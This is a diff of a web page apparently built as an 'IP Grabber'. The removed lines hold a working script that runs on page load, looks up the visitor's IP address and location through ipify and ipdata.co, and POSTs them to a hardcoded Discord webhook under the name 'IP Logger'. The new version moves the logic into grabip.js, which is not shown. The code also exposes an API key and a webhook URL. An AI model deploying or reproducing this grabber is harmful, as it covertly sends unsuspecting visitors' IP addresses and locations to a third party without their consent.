@@ -1,43 +1,12 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-<script type="text/javascript">
-
-
-function getIP(json) {
-    function json(url) {
-    return fetch(url).then(res => res.json());
-    }
-    
-    let apiKey = '99f28637fe5c37be4b63661aa83f8a0b55c96c057f132445661a2d0a';
-    json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
-
-    // so many more properties
-
-     var request = new XMLHttpRequest();
-     
-     request.open("POST", "https://discord.com/api/webhooks/1557067203801518124/Se4P2tmcCArmfKf_4KWesRJ6Ong33_AhEU2y8SO4Bsrt7cKQvsSKzz1pwtGPeytA2plo");
-     
-     request.setRequestHeader('Content-type', 'application/json');
-     
-     var params = 
-     {
-          username: "IP Logger",
-          avatar_url: "",
-          content: "IP:  " + data.ip + "**         **" + "City:  " + data.city + "**         **" +  "Country:  " + data.country_code +  "**         **" + "Region:  " +  data.region
-     }
-     
-     request.send(JSON.stringify(params));
-    });
-}
-
-</script>
-<style>
-    *{
-        background-color: black;
-    }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Grabber</title>
 </head>
-<script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
-<body onload="getIP()">  
+<body>
+    <h1>IP Grabbed!</h1>
+    <script src="grabip.js"></script>
 </body>
 </html>
